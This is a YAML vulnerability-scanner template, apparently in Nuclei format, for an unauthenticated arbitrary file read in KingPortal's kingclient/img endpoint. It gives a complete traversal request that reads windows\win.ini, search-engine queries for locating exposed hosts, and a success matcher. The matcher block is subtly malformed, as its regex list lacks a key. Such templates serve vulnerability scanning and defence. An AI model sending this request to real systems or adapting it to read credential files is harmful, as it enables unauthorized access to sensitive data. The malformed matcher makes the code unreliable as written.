id: kingportal-img-fileread
info:
  name: 北京亚控科技 kingportal imgPath - 任意文件读取漏洞
  author: leadlife
  severity: high
  description: KingPortal客户端开发系统 img 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference: 
    - https://github.com/wy876/POC/blob/9eefec0a4c311a412a86ab83bef3a25d3cb1766d/%E5%8C%97%E4%BA%AC%E4%BA%9A%E6%8E%A7%E7%A7%91%E6%8A%80/%E5%8C%97%E4%BA%AC%E4%BA%9A%E6%8E%A7%E7%A7%91%E6%8A%80img%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="/public/javascripts/Common/Util/km_util.js"
    hunter-query: web.title="KingPortal"
  tags: 2025,fileread,kingportal

http:
  - raw:
      - |
        GET /kingclient/img?imgPath=..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: keep-alive

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
          - "\\[(font|extension|file)s\\]"

      - type: status
        status:
          - 200